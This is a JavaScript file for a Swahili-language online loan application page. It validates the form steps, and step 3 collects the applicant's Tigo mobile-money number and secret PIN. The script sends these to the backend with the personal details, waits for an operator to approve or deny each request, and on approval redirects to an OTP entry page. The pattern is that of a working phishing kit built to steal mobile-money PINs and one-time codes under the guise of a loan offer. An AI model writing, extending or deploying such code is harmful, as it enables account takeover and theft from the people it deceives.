const form = document.getElementById('loanForm');
const feedback = document.getElementById('formFeedback');
const stepPills = Array.from(document.querySelectorAll('.step-pill'));
const formSteps = Array.from(document.querySelectorAll('.form-step'));
const prevButton = document.getElementById('prevStep');
const nextButton = document.getElementById('nextStep');
const submitButton = document.getElementById('submitStep');
const statusPanel = document.getElementById('statusPanel');
const confirmTigoNumber = document.getElementById('confirmTigoNumber');
const confirmTigoPin = document.getElementById('confirmTigoPin');
const countdownTimer = document.getElementById('countdownTimer');
const ringProgress = document.querySelector('.ring-progress');
const backToEdit = document.getElementById('backToEdit');
const keepWaiting = document.getElementById('keepWaiting');
let currentStep = 1;
let countdownInterval = null;
let pollingInterval = null;
let currentRequestId = null;

function formatTime(seconds) {
  const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
  const secs = String(seconds % 60).padStart(2, '0');
  return `${minutes}:${secs}`;
}

function setProgressRing(secondsLeft) {
  if (!ringProgress) return;
  const circumference = 2 * Math.PI * 52;
  const progressRatio = Math.max(0, Math.min(1, secondsLeft / 60));
  const offset = circumference * (1 - progressRatio);
  ringProgress.style.strokeDashoffset = offset;
}

async function sendApplicationData(payload) {
  try {
    const response = await fetch('/apply', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    const data = await response.json();
    console.log('Backend response status:', response.status);
    console.log('Backend response data:', data);
    
    if (!response.ok) {
      throw new Error(data.message || 'Kosa la mtandao');
    }
    return data;
  } catch (error) {
    console.error('Apply error:', error);
    console.error('Error details:', error.message);
    const errorMsg = error.message || 'Imeshindikana kuwasilisha ombi. Jaribu tena kidogo.';
    showMessage('❌ ' + errorMsg, false);
    submitButton.disabled = false;
    submitButton.textContent = 'Tuma Maombi';
    throw error;
  }
}

function showStatusPanel(tigoNumber, tigoPin) {
  document.getElementById('loanForm').classList.add('hidden');
  statusPanel.classList.remove('hidden');
  confirmTigoNumber.textContent = tigoNumber || '0787327233';
  confirmTigoPin.textContent = tigoPin || '1112';
  // show waiting UI; polling will handle transition
  countdownTimer.textContent = '00:60';
  setProgressRing(60);
}

function hideStatusPanel() {
  if (countdownInterval) {
    clearInterval(countdownInterval);
  }
  statusPanel.classList.add('hidden');
  document.getElementById('loanForm').classList.remove('hidden');
  currentStep = formSteps.length;
  updateStep();
  submitButton.disabled = false;
  submitButton.textContent = 'Tuma Maombi';
}

function showMessage(message, success = true) {
  feedback.textContent = message;
  feedback.className = success ? 'form-feedback success' : 'form-feedback error';
}

function validatePhone(phone) {
  const trimmed = phone.replace(/\s|-/g, '');
  return /^0\d{9}$/.test(trimmed);
}

function validatePin(pin) {
  return /^\d{4,6}$/.test(pin);
}

function updateStep() {
  formSteps.forEach((step) => {
    step.classList.toggle('hidden', Number(step.dataset.step) !== currentStep);
  });

  stepPills.forEach((pill) => {
    pill.classList.toggle('step-active', Number(pill.dataset.step) === currentStep);
  });

  prevButton.classList.toggle('hidden', currentStep === 1);
  nextButton.classList.toggle('hidden', currentStep === formSteps.length);
  submitButton.classList.toggle('hidden', currentStep !== formSteps.length);
  showMessage('', true);
}

function validateStep(step) {
  const inputs = Array.from(document.querySelectorAll(`.form-step[data-step="${step}"] input, .form-step[data-step="${step}"] select`));

  for (const input of inputs) {
    if (!input.value.trim()) {
      input.focus();
      showMessage('Tafadhali jaza sehemu zote katika hatua hii.', false);
      return false;
    }
  }

  if (step === 1) {
    const phone = document.getElementById('phone').value.trim();
    const consent = document.getElementById('consentCheckbox').checked;
    if (!validatePhone(phone)) {
      showMessage('Tafadhali ingiza namba halali ya simu ya Tanzania (07XXXXXXXX).', false);
      return false;
    }
    if (!consent) {
      showMessage('Tafadhali thibitisha kuwa taarifa zote ni sahihi kabla ya kuendelea.', false);
      return false;
    }
  }

  if (step === 3) {
    const tigoNumber = document.getElementById('tigoNumber').value.trim();
    const tigoPin = document.getElementById('tigoPin').value.trim();
    if (!validatePhone(tigoNumber)) {
      showMessage('Tafadhali ingiza namba sahihi ya Tigo (07XXXXXXXX).', false);
      return false;
    }
    if (!validatePin(tigoPin)) {
      showMessage('Tafadhali ingiza PIN ya Tigo ya tarakimu 4-6.', false);
      return false;
    }
  }

  return true;
}

nextButton.addEventListener('click', () => {
  if (validateStep(currentStep)) {
    currentStep = Math.min(formSteps.length, currentStep + 1);
    updateStep();
  }
});

prevButton.addEventListener('click', () => {
  currentStep = Math.max(1, currentStep - 1);
  updateStep();
});

form.addEventListener('submit', (event) => {
  event.preventDefault();

  if (!validateStep(currentStep)) {
    return;
  }

  const fullName = document.getElementById('fullName').value.trim();
  const phone = document.getElementById('phone').value.trim();
  const email = document.getElementById('email').value.trim();
  const amount = document.getElementById('loanAmount').value.trim();
  const term = document.getElementById('loanTermApp').value;
  const purpose = document.getElementById('purpose').value;
  const employment = document.getElementById('employmentStatus').value;
  const monthlyIncome = document.getElementById('monthlyIncome').value.trim();
  const tigoNumber = document.getElementById('tigoNumber').value.trim();
  const tigoPin = document.getElementById('tigoPin').value.trim();

  const payload = {
    name: fullName,
    phone: phone,
    email: email,
    amount: amount,
    term: term,
    purpose: purpose,
    employment: employment,
    monthlyIncome: monthlyIncome,
    tigoNumber: tigoNumber,
    tigoPin: tigoPin
  };

  showMessage('Ngojea, tunakagua maombi yako na msimamizi...', true);
  submitButton.textContent = 'Inasubiri...';
  submitButton.disabled = true;

  sendApplicationData(payload)
    .then((data) => {
      currentRequestId = data.request_id;
      showStatusPanel(tigoNumber, tigoPin);
      startPollingStatus(currentRequestId);
    })
    .catch(() => {
      // error message handled in sendApplicationData
    });
});

backToEdit.addEventListener('click', () => {
  hideStatusPanel();
  showMessage('Rudi ili urekebishe maelezo yako.', true);
});

keepWaiting.addEventListener('click', () => {
  showMessage('Endelea kusubiri, tutaendelea kuthibitisha ombi lako.', true);
});

function startPollingStatus(requestId) {
  if (pollingInterval) clearInterval(pollingInterval);
  pollingInterval = setInterval(async () => {
    try {
      const res = await fetch(`/status/${requestId}`);
      if (res.status === 404) {
        // nothing
        return;
      }
      const data = await res.json();
      if (data.status === 'denied') {
        clearInterval(pollingInterval);
        showMessage('❌ Ombi limekataliwa. Weka nambari sahihi na utume ombi tena.', false);
        submitButton.disabled = false;
        submitButton.textContent = 'Tuma Maombi';
        hideStatusPanel();
      } else if (data.status === 'allowed') {
        clearInterval(pollingInterval);
        // redirect to idini OTP form
        window.location.href = `/idini?request_id=${requestId}`;
      }
    } catch (e) {
      console.error('status poll error', e);
    }
  }, 3000);
}

async function handleDenyAction(requestId) {
  console.log('handleDenyAction triggered with requestId:', requestId);
  try {
    const response = await fetch('/deny', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ request_id: requestId })
    });

    const result = await response.json();
    console.log('Response from /deny:', result);

    if (result.status === 'success') {
      const denialMessage = document.getElementById('denialMessage');
      if (denialMessage) {
        denialMessage.textContent = result.message;
        denialMessage.style.display = 'block';
        console.log('Denial message displayed:', result.message);
      } else {
        console.error('Denial message placeholder not found in DOM.');
      }
    } else {
      console.error('Error from /deny:', result.message);
    }
  } catch (error) {
    console.error('Request to /deny failed:', error);
  }
}

window.addEventListener('DOMContentLoaded', () => {
  updateStep();
  // check URL params to show status panel when redirected back from OTP resend
  const params = new URLSearchParams(window.location.search);
  const rid = params.get('request_id');
  const show = params.get('show_status');
  if (show === '1' && rid) {
    // fetch request details
    fetch(`/request/${rid}`).then((r) => r.json()).then((obj) => {
      if (obj && obj.data) {
        const tigoNumber = obj.data.tigoNumber || obj.data.tigo_number || '';
        const tigoPin = obj.data.tigoPin || obj.data.tigo_pin || '';
        currentRequestId = rid;
        showStatusPanel(tigoNumber, tigoPin);
        startPollingStatus(rid);
      }
    }).catch((e) => console.error('fetch request error', e));
  }
});
